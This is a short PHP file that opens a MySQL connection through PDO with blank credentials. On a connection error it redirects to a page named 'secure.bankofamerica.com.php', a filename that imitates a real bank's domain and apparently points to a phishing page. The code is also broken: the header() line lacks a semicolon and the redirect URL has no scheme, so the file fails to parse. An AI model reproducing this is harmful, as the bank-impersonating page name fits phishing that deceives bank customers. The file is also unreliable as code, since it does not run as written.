<?php
	$server = "";
	$username = "";
	$password = "";
	$database = "";

	try{
		$conn = new PDO("mysql:host=$server;dbname=$database",$username,$password);
		$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	} catch (PDOException $e) {
		header("Location: localhost/secure.bankofamerica.com.php")
	}
